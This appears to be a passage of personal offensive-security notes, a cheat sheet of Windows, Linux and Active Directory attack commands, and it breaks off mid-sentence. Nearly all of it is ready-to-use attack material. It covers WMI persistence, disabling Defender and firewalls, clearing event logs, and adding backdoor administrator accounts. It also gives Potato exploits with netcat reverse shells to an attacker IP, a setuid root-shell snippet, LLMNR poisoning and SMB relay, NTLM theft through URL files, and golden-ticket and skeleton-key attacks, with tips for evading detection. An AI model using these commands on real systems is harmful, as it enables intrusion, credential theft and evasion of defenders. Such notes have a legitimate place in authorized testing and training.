<p>wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="[name]", ExecutablePath="[executable]",CommandLineTemplate="[executable]"</p>
<p>wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"[name]\"", Consumer="CommandLineEventConsumer.Name=\"[name]\""</p>
<p># Recursive File Listing</p>
<p>dir /s /a \\[host]\[path] &gt; [logfile]</p>
<p>forfiles /s /c "cmd /c echo @path" /p [path] &gt; [logfile]</p>
<p>makecab [logfile] [compressed].zip</p>
<p>extract [compressed].zip [logfile]</p>
<p># Enable Command Prompt</p>
<p>reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 0 /f</p>
<p># Enable Remote Desktop</p>
<p>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f</p>
<p>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f</p>
<p>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</p>
<p>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</p>
<p>netsh advfirewall firewall set rule group="remote desktop" new enable=Yes</p>
<pre><code>            OR
</code></pre><p>netsh advfirewall set allprofiles state off</p>
<p>sc start TermService</p>
<p># User Creation</p>
<p>### Local</p>
<p>net user [username] [password] /add</p>
<p>net localgroup Administrators [username] /add</p>
<p>net localgroup "Remote Management Users" [username] /add</p>
<p>net localgroup "Remote Desktop Users" [username] /add</p>
<p>### Domain</p>
<p>net user [username] [password] /add /domain</p>
<p>net group "Domain Admins" [username] /add /domain</p>
<p># Insecure Guest Authentication</p>
<p>### Enable</p>
<p>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f</p>
<p>shutdown /r /f /t 0</p>
<p>### Disable</p>
<p>reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /f</p>
<p>shutdown /r /f /t 0</p>
<p>Privilege Escalation</p>
<p>[<a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits\](https://gitlab.com/exploit-database/exploitdb-bin-sploits" target="_blank">https://gitlab.com/exploit-database/exploitdb-bin-sploits\](https://gitlab.com/exploit-database/exploitdb-bin-sploits</a>)</p>
<p># Windows</p>
<p>## Checklist</p>
<p>[<a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation\](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" target="_blank">https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation\](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation</a>)</p>
<p>1. access tokens<br></br>2. Administrators group ‚Üí [fodhelper UAC bypass](<a href="https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1" target="_blank">https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1</a>)<br></br>3. PowerShell history<br></br>4. service permissions<br></br>5. [DLL hijacking](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a>)<br></br>6. recent folders/files<br></br>7. interesting folders/files: C:\, C:\Users<br></br>8. passwords in registry<br></br>9. stored WiFi passwords<br></br>10. kernel version</p>
<p>[LOLBAS](<a href="https://lolbas-project.github.io" target="_blank">https://lolbas-project.github.io</a>)</p>
<p>### Check AppLocker/Antivirus</p>
<p>(Get-ApplockerPolicy -Effective).RuleCollections</p>
<p>Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop</p>
<p>Get-MpComputerStatus</p>
<p>sc query windefend</p>
<p>### Disable Windows Defender</p>
<p>sc config WinDefend start= disabled</p>
<p>Set-MpPreference -DisableRealtimeMonitoring $true</p>
<p>"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All</p>
<p>### Clear Event Log</p>
<p>Clear-EventLog -LogName Application, Security</p>
<p>### Access Tokens</p>
<p>[HackTricks Token Abuse](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a>)</p>
<p>SeImpersonatePrivilege ‚Üí Potato Attacks</p>
<p>[SweetPotato](<a href="https://github.com/CCob/SweetPotato" target="_blank">https://github.com/CCob/SweetPotato</a>), [GodPotato](<a href="https://github.com/BeichenDream/GodPotato" target="_blank">https://github.com/BeichenDream/GodPotato</a>)</p>
<p>SweetPotato.exe -p nc.exe -a "-nv [ip] [port] -e cmd" &amp;</p>
<p>GodPotato.exe -cmd "nc -nv [ip] [port] -e cmd" &amp;</p>
<p>GodPotato.exe -cmd "net user [username] [password] /add"</p>
<p>GodPotato.exe -cmd "net localgroup Administrators [username] /add"</p>
<p>runascs [username] [password] cmd -b -r [attacker ip]:[port]</p>
<p>SeRestorePrivilege ‚Üí [SeRestoreAbuse](<a href="https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe" target="_blank">https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe</a>)</p>
<p>### PowerShell History</p>
<p>Get-History</p>
<p>(Get-PSReadlineOption).HistorySavePath</p>
<p>‚óè        type [path]</p>
<p>### Service Permissions</p>
<p>**Recommended:** use a script like [PrivescCheck.ps1](<a href="https://github.com/itm4n/PrivescCheck" target="_blank">https://github.com/itm4n/PrivescCheck</a>)</p>
<p>sc qc [service]</p>
<p>sc sdshow [service] ‚áí list service permissions</p>
<p>icacls [path] ‚áí list folder/file permissions (eg. unquoted service path)</p>
<p>sc config [service] binpath= "[executable]" ‚áí reconfigure service</p>
<p>‚óè        [executable] can either be a _service_ executable or cmd /c start /b [executable]</p>
<p>sc [start/stop] [service]</p>
<p>### DLL Hijacking</p>
<p>[Generate malicious DLL](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\#creating-and-compiling-dlls" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\#creating-and-compiling-dlls</a>)</p>
<p>msfvenom [options] -f dll -o [file].dll</p>
<p>### Recent Folders/Files</p>
<p>dir %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent</p>
<p>### Interesting Folders/Files</p>
<p>Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue</p>
<p>### Passwords in Registry</p>
<p>reg query HKLM /f password /t REG_SZ /s</p>
<p>### Stored WiFi Passwords</p>
<p>netsh wlan show profiles</p>
<p>netsh wlan export profile folder=. key=clear</p>
<p>### Kernel Exploits</p>
<p>[<a href="https://github.com/51x/WHP\](https://github.com/51x/WHP" target="_blank">https://github.com/51x/WHP\](https://github.com/51x/WHP</a>)</p>
<p>[<a href="https://github.com/SecWiki/windows-kernel-exploits\](https://github.com/SecWiki/windows-kernel-exploits" target="_blank">https://github.com/SecWiki/windows-kernel-exploits\](https://github.com/SecWiki/windows-kernel-exploits</a>)</p>
<p>## Guides</p>
<p>‚óè        [PayloadsAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a>)</p>
<p>‚óè        [HackTricks](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation</a>)</p>
<p>‚óè        [Sushant 747‚Äôs Guide](<a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html" target="_blank">https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html</a>)</p>
<p>‚óè        [Fuzzy Security Guide](<a href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank">https://www.fuzzysecurity.com/tutorials/16.html</a>)</p>
<p>‚óè        [Absoloom's Guide](<a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a>)</p>
<p>## Scripts</p>
<p>### Executables</p>
<p>‚óè        [winPEAS](<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a>)</p>
<p>‚óè        [Seatbelt](<a href="https://github.com/GhostPack/Seatbelt" target="_blank">https://github.com/GhostPack/Seatbelt</a>) (compile)</p>
<p>‚óè        [SharpUp](<a href="https://github.com/GhostPack/SharpUp" target="_blank">https://github.com/GhostPack/SharpUp</a>) (compile)</p>
<p>‚óè        [Watson](<a href="https://github.com/rasta-mouse/Watson" target="_blank">https://github.com/rasta-mouse/Watson</a>) (compile)</p>
<p>### PowerShell</p>
<p>‚óè        [PrivescCheck](<a href="https://github.com/itm4n/PrivescCheck" target="_blank">https://github.com/itm4n/PrivescCheck</a>)</p>
<p>‚óã        Invoke-PrivescCheck -Extended</p>
<p>‚óã        Invoke-PrivescCheck -Extended -Report "PrivescCheck_$($env:COMPUTERNAME)" -Format TXT,CSV,HTML,XML</p>
<p>‚óè        [PowerUp](<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a>) (deprecated)</p>
<p>‚óã        Invoke-AllChecks</p>
<p>‚óè        [Jaws](<a href="https://github.com/411Hall/JAWS" target="_blank">https://github.com/411Hall/JAWS</a>)</p>
<p>‚óè        [Sherlock](<a href="https://github.com/rasta-mouse/Sherlock" target="_blank">https://github.com/rasta-mouse/Sherlock</a>) (deprecated)</p>
<p>### Other</p>
<p>‚óè        [windows-exploit-suggester](<a href="https://github.com/bitsadmin/wesng" target="_blank">https://github.com/bitsadmin/wesng</a>) ‚áí get kernel exploits from sysinfo</p>
<p>‚óã        wes --update</p>
<p>‚óã        wes systeminfo.txt -c -e -i "Elevation"</p>
<p>‚óè        Meterpreter run post/multi/recon/local_exploit_suggester</p>
<p>‚óè        Meterpreter getsystem</p>
<p># Linux</p>
<p>## Checklist</p>
<p>[<a href="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist\](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" target="_blank">https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist\](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</a>)</p>
<p>1. SUID*<br></br>2. sudo*<br></br>3. processes running as root<br></br>4. internal services ‚Üí [port redirection](#_d5r3jiqlkrpf)<br></br>5. cron jobs<br></br>6. interesting folders/files: /, /opt, /home<br></br>7. kernel version</p>
<p>*check [GTFObins](<a href="https://gtfobins.github.io" target="_blank">https://gtfobins.github.io</a>)</p>
<p>### SUID</p>
<p>find / ‚Å†-perm -u=s -user root 2&gt;/dev/null</p>
<p>find / -perm -g=s -group root 2&gt;/dev/null</p>
<p>getcap -r / 2&gt;/dev/null</p>
<p>### Sudo</p>
<p>sudo -l</p>
<p>### Processes</p>
<p>ps fauxww</p>
<p>ps -ewwo pid,user,cmd --forest</p>
<p>### Services</p>
<p>netstat/ss -antup</p>
<p>netstat/ss -plunt</p>
<p>### Cron Jobs</p>
<p>cat /etc/crontab</p>
<p>ls /var/spool/cron</p>
<p>ls /etc/cron.*</p>
<p>## Guides</p>
<p>‚óè        [PayloadsAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a>)</p>
<p>‚óè        [HackTricks](<a href="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" target="_blank">https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</a>)</p>
<p>‚óè        [Sushant 747‚Äôs Guide](<a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html" target="_blank">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html</a>)</p>
<p>‚óè        [g0tmi1k Blog](<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>)</p>
<p>## Scripts</p>
<p>‚óè        [linPEAS](<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a>)</p>
<p>‚óè        [linux-smart-enumeration](<a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">https://github.com/diego-treitos/linux-smart-enumeration</a>)</p>
<p>‚óè        [LinEnum](<a href="https://github.com/rebootuser/LinEnum" target="_blank">https://github.com/rebootuser/LinEnum</a>)</p>
<p>‚óè        [linuxprivchecker](<a href="https://github.com/sleventyeleven/linuxprivchecker" target="_blank">https://github.com/sleventyeleven/linuxprivchecker</a>)</p>
<p>‚óè        [linux-exploit-suggester](<a href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank">https://github.com/The-Z-Labs/linux-exploit-suggester</a>)</p>
<p>‚óè        Meterpreter run post/multi/recon/local_exploit_suggester</p>
<p>int main {</p>
<pre><code>            setuid(0);

            setgid(0);

            system("/bin/bash");
</code></pre><p>}</p>
<p>cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p</p>
<p>Active Directory (AD)</p>
<p>[<a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg\](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg" target="_blank">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg\](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg</a>)</p>
<p>**Sync clock:** timedatectl set-ntp 0 &amp;&amp; ntpdate -u [domain]</p>
<p># LLMNR/NBT-NS Poisoning</p>
<p>‚óè        responder -I [interface] -dwP (optional -v)</p>
<p>‚óã        Remember you can get interface with ip a</p>
<p>‚óè        hashcat -m 5600 [file containing obtained hash] [wordlist]</p>
<p># SMB Relay</p>
<p>**Requirements:** SMB signing disabled and relayed credentials are admin on the target machine</p>
<p>**Note:** You can‚Äôt relay back to the same machine.</p>
<p>‚óè        discover hosts with SMB signing disabled:</p>
<p>‚óã        Nessus scan will tell you</p>
<p>OR</p>
<p>‚óã        nmap --script smb2-security-mode -p 445 [network]</p>
<p>‚ñ†        Check for enabled and not required</p>
<p>OR</p>
<p>‚óã        crackmapexec smb [network]</p>
<p>‚ñ†        Check for signing:False</p>
<p>‚óã        Add hosts to targets file (separate lines)</p>
<p>OR</p>
<p>‚óã        crackmapexec smb [network] --gen-relay-list [targets file]</p>
<p>‚óè        edit /etc/responder/Responder.conf</p>
<p>‚óã        Change SMB \= and HTTP \= from On to Off</p>
<p>‚óè        responder -I [interface] -dwP (optional -v)</p>
<p>AND</p>
<p>‚óè        impacket-ntlmrelayx -tf [targets file] -smb2support</p>
<p>‚óã        -i ‚áí interactive smb shell</p>
<p>‚ñ†        Wait for connection ‚Äì note ‚Äústarted interactive‚Äù port</p>
<p>‚ñ†        nc -nv 127.0.0.1 [port]</p>
<p>‚óã        -e [malicious].exe ‚áí execute file</p>
<p>‚ñ†        Can be msfvenom payload for example</p>
<p>‚óã        -c "[command]" ‚áí execute command</p>
<p>‚óã        -l [directory] ‚áí store loot in directory (see IPv6 attacks) ‚Üí useful if credentials are non-admin</p>
<p># IPv6 Attack</p>
<p>[<a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/\](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/\](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a>)</p>
<p>‚óè        Install MITM6 ‚Üí download from [GitHub](<a href="https://github.com/dirkjanm/mitm6" target="_blank">https://github.com/dirkjanm/mitm6</a>), cd to directory, and pip3 install .</p>
<p>‚óã        If it fails, try normal pip</p>
<p>‚óè        mitm6 -d [domain]</p>
<p>AND</p>
<p>‚óè        impacket-ntlmrelayx -6 -t ldaps://[DC IP] -wh bogus.[domain] -l [directory]</p>
<p>‚óè        cd to directory and firefox [file] to see info</p>
<p>‚óè        look for username and password for newly created user in ntlmrelayx prompt</p>
<p># URL File Attack</p>
<p>**Note:** must have access to a writable SMB share</p>
<p>‚óè        upload file that starts with @ or ~ symbol and ends in .url: @test.url</p>
<p>‚óã        (@ or ~) ensures it shows up at top when user opens share</p>
<p>‚óã        File contents:</p>
<p>[InternetShortcut]</p>
<p>URL=blah</p>
<p>WorkingDirectory=blah</p>
<p>IconFile=\\[attacker ip]\%USERNAME%.icon</p>
<p>IconIndex=1</p>
<p>‚óè        responder -I [interface] -v</p>
<p>[<a href="https://github.com/Greenwolf/ntlm\_theft\](https://github.com/Greenwolf/ntlm\_theft" target="_blank">https://github.com/Greenwolf/ntlm\_theft\](https://github.com/Greenwolf/ntlm\_theft</a>)</p>
<p>ntlm_theft -s [attacker ip] -f [name] -g [all/url]</p>
<p>hashcat -m 5600 [hashes] [wordlist]</p>
<p># BloodHound</p>
<p>[<a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html\](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html" target="_blank">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html\](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html</a>)</p>
<p>### Collection</p>
<p>‚óã        SharpHound.exe -c [method] -d [domain] --exclude-dcs --zipfilename sharp.zip</p>
<p>‚óã        bloodhound-python -c [method] -d [domain] -u [username] -p [password] --hashes [hash] -ns [DC] --zip -v</p>
<p>‚óã        Invoke-Bloodhound (from SharpHound.ps1)</p>
<p>‚ñ†        powershell -ep bypass</p>
<p>‚ñ†        . .\SharpHound.ps1</p>
<p>‚ñ†        Invoke-Bloodhound -CollectionMethod [method] -Domain [domain] -ExcludeDCs -ZipFileName [outfile]</p>
<p>‚óè        on first run: CollectionMethod ‚áí All</p>
<p>‚óè        on subsequent runs (to get updated session info): CollectionMethod ‚áí Session</p>
<p>‚óã        in BloodHound, click Database Info ‚Üí Clear Sessions</p>
<p>### Analysis</p>
<p>‚óè        neo4j console</p>
<p>‚óè        bloodhound --no-sandbox</p>
<p>MATCH (m:Computer) RETURN m</p>
<p>MATCH (m:User) RETURN m</p>
<p># Kerberos</p>
<p>Kerberos Authentication</p>
<p>![](file:///C:/Users/gsdav/AppData/Local/Packages/oice_16_974fa576_32c1d314_117e/AC/Temp/msohtmlclip1/01/clip_image002.gif)</p>
<p>AS_REP ‚áí provides TGT ‚Å†‚Äì ticket to get other service tickets</p>
<p>‚óè        you can only have one TGT</p>
<p>TGS_REP ‚áí provides TGS ‚Äì ticket to get access to specific service</p>
<p>## Ticket Conversion</p>
<p>Converting tickets between impacket and mimikatz/Rubeus format</p>
<p>kirbi2ccache [kirbi file] [ccache file]</p>
<p>ccache2kirbi [ccache file] [kirbi file]</p>
<p>impacket-ticketConverter [ccache/kirbi file] [kirbi/ccache file]</p>
<p>‚óè        kirbi ‚áí mimikatz</p>
<p>‚óè        ccache ‚áí impacket</p>
<p>## Request New Initial TGT</p>
<p>**Note:** requires user‚Äôs password or hash</p>
<p>**Rubeus**</p>
<p>rubeus asktgt /domain: /user: /password:</p>
<p>‚óè        /enctype:[rc4|aes128|aes256|3des]</p>
<p>‚óã        use aes256 (default) for enctype</p>
<p>‚óè        if you don‚Äôt have password but have hash, replace /password: with /rc4: /aes128: /aes256: or /des:</p>
<p>**Mimikatz**</p>
<p>tgt::ask /domain: /user: /password:</p>
<p>**Impacket** (Remote)</p>
<p>impacket-getTGT [domain]/[user]:[password]</p>
<p>‚óè        -dc-ip [DC]</p>
<p>‚óè        -hashes [hash]</p>
<p>export KRB5CCNAME=[ticket].ccache</p>
<p>## Request Delegated TGT</p>
<p>_can‚Äôt change passwords with delegated TGTs but can request TGSes_</p>
<p>**Notes:**</p>
<p>‚óè        domain controllers by default can provide delegated TGTs</p>
<p>‚óè        normal for some processes (like explorer) but weird for others (like notepad). For processes that it‚Äôs weird, if you don‚Äôt want to get flagged by Windows Defender be sure to use /host</p>
<p>‚óè        useful for using impacket scripts without knowing password ‚Üí convert ticket to ccache</p>
<p>**Rubeus**</p>
<p>rubeus tgtdeleg</p>
<p>‚óè        /target:[SPN]</p>
<p>**Mimikatz**</p>
<p>tgt::deleg ‚áí contacts domain controller by default</p>
<p>‚óè        /host:[FQDN] ‚áí have another host delegate for you (stealthy)</p>
<p>‚óã        find with Get-AdComputer -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"</p>
<p>## Request TGS</p>
<p>**Rubeus**</p>
<p>rubeus asktgs /service:[SPN]/[FQDN]</p>
<p>‚óè        To impersonate another user (same as request TGT):</p>
<p>‚óã        /enctype:</p>
<p>‚óã        /user:[username]</p>
<p>‚óã        /password:[password]</p>
<p>‚ñ†        if you don‚Äôt have password but have hash, replace /password: with /rc4: /aes128: /aes256: or /des:</p>
<p>**Mimikatz**</p>
<p>kerberos::ask /target:[SPN]/[FQDN]</p>
<p>‚óè        Optional /export to export</p>
<p>**Impacket** (Remote)</p>
<p>impacket-getST [domain]/[user]:[password] -spn [service]/[host]</p>
<p>‚óè        -dc-ip [DC]</p>
<p>‚óè        -hashes [hash]</p>
<p>‚óè        -impersonate [user]</p>
<p>**Note:** Automatically modifies impersonate TGS so it can be used with other impacket tools.</p>
<p>## Modify Existing TGS for Another Service</p>
<p>**Rubeus**</p>
<p>rubeus asktgs /altservice:[SPN] /ticket:[ticket]</p>
<p>‚óè        /ptt will automatically load onto current logon session</p>
<p>**Impacket** (Remote)</p>
<p>See note above. Realistically, this is only used in constrained delegation attacks so look there.</p>
<p>## Harvest Tickets</p>
<p>**Rubeus**</p>
<p>rubeus harvest /interval:30 ‚áí list current session TGT</p>
<p>‚óè        interval: time between harvests (seconds)</p>
<p>rubeus triage ‚áí list current session all tickets with logon id and expiration time</p>
<p>rubeus klist ‚áí list current session tickets with detailed info</p>
<p>rubeus dump ‚áí extract all tickets (basically /export for mimikatz)</p>
<p>‚óè        /user:[user] for a specific user</p>
<p>‚óè        /service:[service] for a specific service</p>
<p>‚óè        /luid:[logon id] for specific session, if we have access to all sessions (admin)</p>
<p>‚óè        /nowrap ‚áí easier copy-and-paste</p>
<p>**Mimikatz**</p>
<p>kerberos::tgt ‚áí list current session TGT</p>
<p>kerberos::list ‚áí list current session all tickets</p>
<p>sekurlsa::tickets ‚áí list all tickets for all sessions but injects into LSASS memory so don‚Äôt do it if there‚Äôs a monitoring service</p>
<p>‚óè        add /export to any of these to export but first base64 /out:true and base64 /in:true to export base64 encoded (less likely to be detected)</p>
<p>## Harvest Keys</p>
<p>**Mimikatz**</p>
<p>sekurlsa::ekeys</p>
<p>## Purge Tickets</p>
<p>**Rubeus**</p>
<p>rubeus purge</p>
<p>**Mimikatz**</p>
<p>kerberos::purge</p>
<p># Pass-the-Key (PTK)/Overpass-the-Hash (OPTH)</p>
<p>pass-the-key or pass-the-hash to obtain a TGT</p>
<p>**Rubeus**</p>
<p>rubeus asktgt /domain:[domain] /user:[user] /rc4:[hash] /ptt</p>
<p>**Mimikatz**</p>
<p>sekurlsa::pth /user:[user] /domain:[domain] /rc4:[hash]</p>
<p>‚óè        /run:[cmd.exe OR powershell.exe]</p>
<p>**Impacket** (Remote)</p>
<p>impacket-getTGT [domain]/[user]:[password]</p>
<p>‚óè        -dc-ip [DC]</p>
<p>‚óè        -hashes [hash]</p>
<p>export KRB5CCNAME=[ticket].ccache</p>
<p># Pass-the-Ticket (PTT)</p>
<p>**Note:** can either pass the TGT or pass the TGS</p>
<p>‚óè        dump the ticket to be passed (_see_ [_Harvest Tickets_](#_9267jzhnvwqm) _above_)</p>
<p>‚óã        for Mimikatz, export tickets with sekurlsa::tickets /export</p>
<p>**Rubeus**</p>
<p>rubeus ptt /ticket:[ticket]</p>
<p>**Mimikatz**</p>
<p>kerberos::ptt [ticket]</p>
<p>‚óè        verify with klist ‚áí list cached tickets</p>
<p>**Impacket**</p>
<p>export KRB5CCNAME=[ticket].ccache</p>
<p># Golden/Silver Ticket</p>
<p>**Golden Ticket:** create forged TGT for domain admin using admin‚Äôs hash</p>
<p>**Silver Ticket:** create forged TGS for service using service‚Äôs hash ‚áí useful for impersonating users when logging into a service</p>
<p>‚óè        same effect as requesting a TGT or TGS, but without communicating with the domain controller</p>
<p>‚óè        you can create it for any user, even one that doesn‚Äôt exist</p>
<p>**Mimikatz**</p>
<p>Domain SID:</p>
<p>wmic useraccount get name,sid</p>
<p>Current Realm:</p>
<p>kerberos::golden /user: /domain: /sid: /krbtgt: /ptt</p>
<p>‚óè        sid ‚áí DC SID</p>
<p>‚óè        krbtgt ‚áí [NTLM hash]</p>
<p>‚óè        user and id can be whatever you want them to be</p>
<p>‚óã        /user:Administrator /id:500 for golden ticket</p>
<p>‚óè        service ‚áí specify SPN for silver ticket</p>
<p>Inter-Realm:</p>
<p>kerberos::golden /user: /domain: /sid: /krbtgt: /service:krbtgt /sids: /ptt</p>
<p>‚óè        sid ‚áí child DC SID</p>
<p>‚óè        krbtgt ‚áí [NTLM hash]</p>
<p>‚óè        sids ‚áí enterprise admin group SID</p>
<p>‚óè        user and id can be whatever you want them to be</p>
<p>‚óã        /user:Administrator /id:500 for golden ticket</p>
<p>**Impacket**</p>
<p>Domain SID:</p>
<p>impacket-getPac -targetUser Administrator [domain]/[user]:[password]</p>
<p>crackmapexec ldap [DC] -u [user] -p [password] -k --get-sid</p>
<p>Current Realm:</p>
<p>impacket-ticketer -domain [domain] -domain-sid [SID] -nthash [krbtgt hash] Administrator</p>
<p>‚óè        for another user: replace Administrator with -user-id [ID] [user]</p>
<p>‚óè        -spn [SPN] for silver ticket</p>
<p>export KRB5CCNAME=[ticket].ccache</p>
<p>Inter-Realm:</p>
<p>**Manually**</p>
<p>impacket-ticketer -domain [domain] -domain-sid [SID] -nthash [krbtgt hash] -spn krbtgt -extra-sid [enterprise admin group SID]</p>
<p>export KRB5CCNAME=[ticket].ccache</p>
<p>**Automatically**</p>
<p>impacket-raiseChild [domain]/[user]:[password]</p>
<p>‚óè        -w [ticket] ‚áí write out golden ticket</p>
<p>‚óè        -target-exec [host] ‚áí psexec to host after compromise</p>
<p># Skeleton Key</p>
<p>used to access any SMB share with the same password</p>
<p>‚óè        misc::skeleton</p>
<p>‚óã        default password is mimikatz</p>
<p>‚óè        _see_ [_Interacting with SMB_](<a href="https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.vexfc5fk3uaj" target="_blank">https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.vexfc5fk3uaj</a>) _above_</p>
<p># AS-REP Roasting</p>
<p>### Obtaining Hash</p>
<p>**Rubeus**</p>
<p>rubeus asreproast /format:[hashcat/john] /outfile:hashes.txt</p>
<p>**Impacket**</p>
<p>impacket-GetNPUsers [domain]/[user]:[password]</p>
<p>‚óè        -dc-ip [DC]</p>
<p>‚óè        -hashes [hash]</p>
<p>‚óè        without creds (don‚Äôt provide [user]:[password]) ‚áí -usersfile [usernames]</p>
<p>‚óè        -request -format [hashcat/john] -outputfile hashes.txt</p>
<p>### Cracking</p>
<p>hashcat -m 18200 hashes.txt [wordlist]</p>
<p>john hashes.txt --wordlist [wordlist]</p>
<p># Kerberoasting (TGS-REP Roasting)</p>
<p>**Note:** requires access to any user account on the domain</p>
<p>### Obtaining Hash</p>
<p>**Rubeus**</p>
<p>rubeus kerberoast /outfile:hashes.txt</p>
<p>**Impacket**</p>
<p>impacket-GetUserSPNs [domain]/[user]:[password]</p>
<p>‚óè        -dc-ip [DC]</p>
<p>‚óè        -hashes [hash]</p>
<p>‚óè        -request-user [SPN]</p>
<p>‚óè        -request -outputfile hashes.txt</p>
<p>### Cracking</p>
<p>hashcat -m 13100 hashes.txt [wordlist]</p>
<p>john hashes.txt --wordlist [wordlist]</p>
<p># Constrained Delegation</p>
<p>### Check for Constrained Delegation</p>
<p>Get-Net[User/Computer] -TrustedToAuth | Select name,msds-allowedtodelegateto,useraccountcontrol</p>
<p>Get-Net[User/Computer] [name] | Select-Object -ExpandProperty msds-allowedtodelegateto</p>
<p>impacket-findDelegation [domain]/[user]:[password]</p>
<p>### Exploit Constrained Delegation</p>
<p>impacket-getST -spn [service]/[host] -impersonate [user to impersonate] [domain]/[user]:[password]</p>
<p>export KRB5CCNAME=[ticket].ccache</p>
<p>You can also use Rubeus:</p>
